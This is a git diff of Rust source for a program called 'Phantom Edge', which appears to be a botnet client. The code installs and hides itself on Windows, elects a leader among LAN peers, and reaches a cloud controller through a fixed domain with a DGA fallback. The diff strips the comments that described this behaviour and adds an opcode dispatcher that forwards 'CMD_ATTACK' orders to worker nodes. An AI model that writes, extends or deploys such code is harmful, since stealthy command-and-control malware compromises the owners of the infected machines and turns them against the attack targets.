@@ -60,18 +60,15 @@ async fn main() {
     env_logger::init();
     info!("Phantom Edge Started - LAN Clustering Mode");
 
-    // 0. Windows Stealth: Install & Hide (If applicable)
     #[cfg(target_os = "windows")]
     modules::windows::check_and_apply_stealth();
     
-    // 0. Start Zero Noise Discovery Daemon (Stealth Mode)
     let stealth_disc = Arc::new(ZeroNoiseDiscovery::new());
     let stealth_clone = stealth_disc.clone();
     tokio::spawn(async move {
         stealth_clone.run_daemon().await;
     });
 
-    // 1. Election / Discovery Phase
     let election = Arc::new(ElectionService::new().await);
     let role = election.run_discovery().await;
 
@@ -85,34 +82,21 @@ async fn main() {
 async fn run_leader_mode(election: Arc<ElectionService>) {
     info!("[Modes] Entering LEADER Mode. Connecting to Cloud + Listening for Workers.");
 
-    // Initialize Network Watchdog
     let watchdog = Arc::new(NetworkWatchdog::new());
     
-    // Start Fallback Monitor (background)
     let wd_clone = watchdog.clone();
     tokio::spawn(async move {
         run_fallback_monitor(wd_clone).await;
     });
 
-    // Start Election Monitor (background) to defend leadership
     let elec_clone = election.clone();
     tokio::spawn(async move {
         elec_clone.monitor_requests().await;
     });
 
-    // 1. Setup Cloud Connection
-    // Master Key (Shared Secret) - In prod use real key
     let master_key = [0x42; 32]; 
-
-    // Bootstrapping Phase (Professional/Tiered)
-    // ProfessionalBootstrapper::new() now automatically configures:
-    // 1. Primary: dht.polydevs.uk (DoH-Google)
-    // 2. Fallback: DGA (DoH-Google)
     let bootstrapper = bootstrapper::ProfessionalBootstrapper::new();
-    // Use manual add_provider only for custom/dead-drops if needed.
-    // e.g. bootstrapper.add_provider(...)
 
-    // 3. Resolve (Race)
     let swarm_nodes = match bootstrapper.resolve().await {
         Some(nodes) => {
             info!("[Bootstrap] Resolved {} Swarm Nodes via Parallel Race.", nodes.len());
@@ -160,12 +144,37 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
 
     // Handle Incoming Commands from Cloud
     let wd_cmd = watchdog.clone();
+    let bridge_tx = msg_tx.clone();
     tokio::spawn(async move {
         while let Some(cmd) = cmd_rx.recv().await {
-            info!("[Leader] Recv Command from Cloud: {:?} bytes", cmd.len());
-            // Mark network alive on every received command
+            info!("[Leader] Recv Command from Cloud: {} bytes", cmd.len());
             wd_cmd.mark_alive();
-            // TODO: Dispatch Command to Workers or Exec locally
+            
+            if cmd.is_empty() { continue; }
+            
+            let opcode = cmd[0];
+            let payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
+            
+            match opcode {
+                0x01 => {
+                    info!("[Leader] CMD_ATTACK: Forwarding to workers");
+                    let _ = bridge_tx.send(cmd.clone()).await;
+                }
+                0x02 => {
+                    info!("[Leader] CMD_UPDATE: Config update received");
+                    let _ = bridge_tx.send(cmd.clone()).await;
+                }
+                0x03 => {
+                    info!("[Leader] CMD_KILL: Shutdown signal");
+                    std::process::exit(0);
+                }
+                0x04 => {
+                    info!("[Leader] CMD_STATUS: Reporting status");
+                }
+                _ => {
+                    warn!("[Leader] Unknown opcode: 0x{:02X}", opcode);
+                }
+            }
         }
     });
 
